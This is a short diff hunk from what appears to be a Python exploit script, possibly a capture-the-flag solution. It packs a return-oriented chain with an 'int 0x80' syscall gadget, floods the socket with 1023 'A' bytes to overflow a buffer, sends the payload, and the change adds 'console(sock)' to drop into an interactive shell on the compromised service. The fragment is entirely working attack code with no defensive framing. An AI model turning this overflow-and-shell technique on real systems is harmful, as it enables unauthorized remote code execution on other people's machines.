@@ -70,5 +70,5 @@ p += pack('<I', 0x08074ded) # int 0x80
 sock.sendall(b'A'*1023)
 time.sleep(1)
 sock.sendall(p)
-
+console(sock)
 # :vim set sw=4 ts=8 sts=8 expandtab:
